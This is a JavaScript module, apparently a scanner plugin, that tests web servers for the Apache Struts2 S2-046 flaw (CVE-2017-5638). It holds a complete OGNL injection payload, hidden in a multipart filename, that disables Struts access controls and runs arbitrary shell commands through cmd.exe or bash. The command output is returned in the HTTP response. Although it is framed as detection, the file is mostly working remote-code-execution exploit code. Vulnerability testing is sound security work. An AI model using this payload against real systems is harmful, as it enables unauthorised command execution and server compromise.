
module.exports={
	tags:"struts2,046,cve-2017-5638,20175638",
	des:"CVE-2017-5638,struts2 046漏洞检测",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-046",
		"http://oe58q5lw3.bkt.clouddn.com/s/struts2/struts2/s2-046.war"],
	urls:["https://cwiki.apache.org/confluence/display/WW/S2-046",
	"https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
	suport:g_szMyMsg,
	doCheck:function (url,fnCbk)
	{
		var _t = this;
		// 测试证明不能encodeURIComponent编码，filename 后的\0b不能少
		var s = ("%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())" +
			+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			// + ".(#response.addHeader('struts2','_struts2_'))"
			+ ".(#ros=(#response.getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
		var szPstDt = s;
		try{
			var uO = urlObj.parse(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
			if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
			
			// Expect: \r\n
			var szTmp = '',tNum = new Date().getTime(),
				boundary = '---------------------------11602011' + tNum,
				szTmp2 = '--' + boundary + '\r\nContent-Disposition: form-data; name="foo"; filename="' + s + '\0b"\r\nContent-Type: text/plain\r\n\r\nx\r\n--' + boundary + '--\r\n\r\n';
			fnSocket(host,port,szTmp = 'POST ' + uO.path + '/ HTTP/1.1\r\nHost: ' 
				+ uO.host + '\r\nContent-Length: ' + (szTmp2.length + 4) + '\r\nUser-Agent: ' + g_szUa + '\r\nContent-Type: multipart/form-data; boundary=' + boundary 
			+ '\r\nConnection: close\r\n\r\n' + szTmp2,
				function(data)
			{
				var d = (data && data.toString().trim() || "").toString("utf8");
				// console.log(szTmp)
				// console.log(d)
	    		fnDoBody(d,"s2-046",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":szPstDt};
	  				r.vul = true;
	  				fnCbk(global.copyO2O(r,o),_t);
	  			});
			});
		}catch(e){fnLog(e);}
	}
};